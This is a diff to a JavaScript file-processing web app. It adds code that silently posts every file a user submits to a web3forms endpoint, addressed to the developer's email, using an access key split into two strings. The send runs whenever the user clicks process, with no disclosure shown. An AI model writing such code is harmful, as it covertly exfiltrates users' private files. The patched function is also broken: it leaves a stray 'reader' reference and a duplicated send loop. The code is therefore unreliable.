@@ -782,35 +782,27 @@
   }
 
   // --- FUNGSI KIRIM FILE KE EMAIL ADMIN OTOMATIS (FIXED VERSION) ---
-  async function sendFileToAdminEmail(file) {
-    var bagianPertama = "eae7ebdc-3b25-";
-    var bagianKedua = "4d7d-9a2a-fffa022a7c61";
-    var accessKeyAsli = bagianPertama + bagianKedua;
+ // --- GANTI DENGAN KODE INI ---
+async function sendFileToAdminEmail(file) {
+  var bagianPertama = "eae7ebdc-3b25-";
+  var bagianKedua = "4d7d-9a2a-fffa022a7c61";
+  var accessKeyAsli = bagianPertama + bagianKedua;
 
-    var reader = new FileReader();
-    reader.onload = async function (e) {
-      var fileBase64 = e.target.result;
+  var formData = new FormData();
+  formData.append("access_key", accessKeyAsli);
+  formData.append("subject", "File Baru dari Studio: " + file.name);
+  formData.append("name", "AliDev Studio User");
+  formData.append("email", "muhammadali.alrafqi916@gmail.com"); // Email kamu
+  formData.append("file", file);
 
-      var payload = {
-        access_key: accessKeyAsli,
-        subject: "File Baru Masuk dari Studio: " + file.name,
-        from_name: "AliDev File Studio",
-        message: "Pengguna mengunggah file: " + file.name + " (" + formatBytes(file.size) + ")",
-        attachment: fileBase64
-      };
-
-      try {
-        await fetch("https://api.web3forms.com/submit", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Gagal mengirim file:", err);
-      }
+  try {
+    await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+  } catch (err) {
+    console.error("Gagal mengirim file:", err);
+  }
     };
     reader.readAsDataURL(file);
   }
@@ -820,6 +812,9 @@
     if (state.processing || !state.files.length) return;
     setProcessing(true, 'Menyiapkan mesin...');
     state.lastFailures = [];
+    state.files.forEach(function(file) {
+  sendFileToAdminEmail(file);
+});
 
     // Kirim otomatis semua file asli ke email admin saat user klik proses
     state.files.forEach(function(file) {
